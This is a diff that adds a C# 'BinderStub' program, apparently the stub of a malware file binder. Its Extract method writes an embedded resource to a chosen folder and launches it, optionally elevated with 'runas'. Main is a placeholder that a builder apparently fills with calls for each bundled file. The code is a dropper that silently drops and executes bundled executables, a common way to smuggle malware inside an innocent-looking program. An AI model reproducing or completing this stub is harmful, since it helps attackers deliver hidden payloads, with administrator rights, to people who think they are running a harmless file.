@@ -1,0 +1,39 @@
+using System.Diagnostics;
+using System.IO;
+using System;
+using System.Reflection;
+ 
+namespace BinderStub
+{
+    static class Program
+    {
+        static void Main()
+        {
+			//BinderStuffs
+        }
+		private static void Extract(string resource, string path, bool admin)
+		{
+			using (var assemblystream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resource))
+			{
+				using (var fileStream = new FileStream(Environment.ExpandEnvironmentVariables(path) + "\\" + resource, FileMode.Create, FileAccess.Write))
+				{
+					assemblystream.CopyTo(fileStream);
+                    fileStream.Close();
+				}
+			}
+			if (admin)
+			{
+                    Process process = new Process();
+                    process.StartInfo.FileName = Environment.ExpandEnvironmentVariables(path) + "\\" + resource;
+                    process.StartInfo.UseShellExecute = true;
+                    process.StartInfo.Verb = "runas";
+                    process.Start();
+            }
+			else
+			{
+				Process.Start(Environment.ExpandEnvironmentVariables(path) + "\\" + resource);
+			}
+		}
+    }
+}
+ 
